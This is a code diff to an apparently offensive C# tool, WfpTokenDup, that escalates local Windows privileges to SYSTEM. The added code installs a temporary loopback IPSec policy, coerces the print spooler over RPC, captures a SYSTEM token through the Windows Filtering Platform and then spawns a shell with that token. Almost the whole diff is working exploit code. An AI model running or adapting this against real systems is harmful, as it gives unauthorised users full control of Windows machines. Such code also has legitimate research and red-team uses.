@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Threading;
 using RpcLibrary;
 using WfpTokenDup.Interop;
 
@@ -182,6 +183,12 @@ namespace WfpTokenDup.Library
                 return false;
             }
 
+            if (NativeMethods.WSAStartup(0x2020, out WSADATA _) != 0)
+            {
+                Console.WriteLine("[-] Failed to setup Windows socket.");
+                return false;
+            }
+
             do
             {
                 var modifiedId = LUID.FromInt64(0L);
@@ -223,6 +230,28 @@ namespace WfpTokenDup.Library
                     Console.WriteLine("[+] Got a WFP engine handle (hanlde = 0x{0}).", hEngine.ToString("X"));
                 }
 
+                Console.WriteLine("[>] Installing new IPSec policy.");
+
+                status = Utilities.InstallIPSecPolicyIPv4(
+                    hEngine,
+                    "PrivFuPolicy",
+                    in Win32Consts.FWPM_PROVIDER_IKEEXT,
+                    "127.0.0.1",
+                    "127.0.0.1",
+                    "psk",
+                    out Guid newPolicyGuid);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to install new IPSec policy.");
+                    break;
+                }
+                else
+                {
+                    Thread.Sleep(300);
+                    Console.WriteLine("[+] New IPSec policy is installed (GUID: {0})", newPolicyGuid.ToString());
+                }
+
                 using (var rpc = new MsRprn())
                 {
                     var printerName = @"\\127.0.0.1";
@@ -259,13 +288,24 @@ namespace WfpTokenDup.Library
                 if (hSystemToken == IntPtr.Zero)
                 {
                     Console.WriteLine("[-] Failed to find SYSTEM token. This technique is not stable, so try again.");
-                    break;
                 }
                 else
                 {
                     Console.WriteLine("[+] Got a SYSTEM token (handle = 0x{0}).", hSystemToken.ToString("X"));
                     Console.WriteLine("    [*] Modified ID : 0x{0}", modifiedId.ToInt64().ToString("X16"));
                 }
+
+                Console.WriteLine("[>] Uninstalling IPSec policy.");
+
+                ntstatus = NativeMethods.FwpmIPsecTunnelDeleteByKey0(hEngine, in newPolicyGuid);
+
+                if (ntstatus != Win32Consts.STATUS_SUCCESS)
+                    Console.WriteLine("[-] Failed to uninstall IPSec policy.");
+                else
+                    Console.WriteLine("[+] IPSec policy is uninstalled successfully.");
+
+                if (hSystemToken == IntPtr.Zero)
+                    break;
 
                 Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");
 
@@ -298,6 +338,8 @@ namespace WfpTokenDup.Library
 
             if (hWfpAle != IntPtr.Zero)
                 NativeMethods.NtClose(hWfpAle);
+
+            NativeMethods.WSACleanup();
 
             Console.WriteLine("[*] Done.");
 
